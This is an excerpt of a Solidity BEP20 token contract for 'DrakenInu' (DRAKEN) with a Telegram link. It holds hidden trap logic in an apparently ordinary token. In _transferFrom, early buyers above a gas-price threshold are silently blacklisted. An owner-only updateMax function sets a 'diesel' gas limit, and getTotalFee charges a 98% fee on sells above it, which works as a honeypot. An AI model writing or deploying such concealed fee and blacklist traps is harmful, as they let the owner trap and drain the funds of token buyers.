...
Telegram : http://t.me/drakeninuportal
...
contract DrakenInu is IBEP20, Auth {
    ...
    string constant _name = "DrakenInu";
    string constant _symbol = "DRAKEN";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair && launchBlock + swapDelay >= block.number && tx.gasprice >= swapAt){isBL[recipient] = true;}
        }
    ...
    function updateMax (uint256 _d) public onlyOwner {
        diesel = _d * 1 gwei;
    }
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        ...
        if(selling) {return tx.gasprice > diesel ? 98 : totalFee.mul(_sellMultiplier);}
        return totalFee;
    }
